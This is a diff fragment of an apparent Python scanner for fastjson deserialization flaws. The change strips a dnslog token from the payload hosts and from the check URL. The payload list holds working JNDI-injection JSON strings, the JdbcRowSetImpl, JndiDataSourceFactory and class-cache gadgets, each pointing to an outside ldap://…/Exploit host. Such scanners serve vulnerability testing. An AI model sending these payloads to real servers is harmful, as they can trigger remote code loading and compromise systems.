@@ -17,9 +17,9 @@ payload =['{"type":0,"pageSize":3,"pageNo":1,"a":"%s"}']
 
 
 payload.append('{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://%s.dnslog.cn/Exploit","autoCommit":"true"}')
-payload.append('{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://%s.f4c8e390.dnslog.link/Exploit"}}')
-payload.append('{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"ldap://%s.f4c8e390.dnslog.link/Exploit","autoCommit":"true"}')
-payload.append('{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl",'+'"dataSourceName":"ldap://%s.f4c8e390.dnslog.link/Exploit","autoCommit":"true"}}')
+payload.append('{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://%s..dnslog.link/Exploit"}}')
+payload.append('{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"ldap://%s..dnslog.link/Exploit","autoCommit":"true"}')
+payload.append('{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl",'+'"dataSourceName":"ldap://%s..dnslog.link/Exploit","autoCommit":"true"}}')
 
 
 
@@ -53,7 +53,7 @@ def checkvuln():
 
 #查看dnslog状态
 def getdnslog(random_str):
-    dns_check = "https://admin.dnslog.link/api/dns/f4c8e390/%s/" % random_str#token 替换为http://admin.dnslog.link平台字符串
+    dns_check = "https://admin.dnslog.link/api/dns//%s/" % random_str#token 替换为http://admin.dnslog.link平台字符串
     res = requests.get(dns_check)
     return res.text.strip()
 
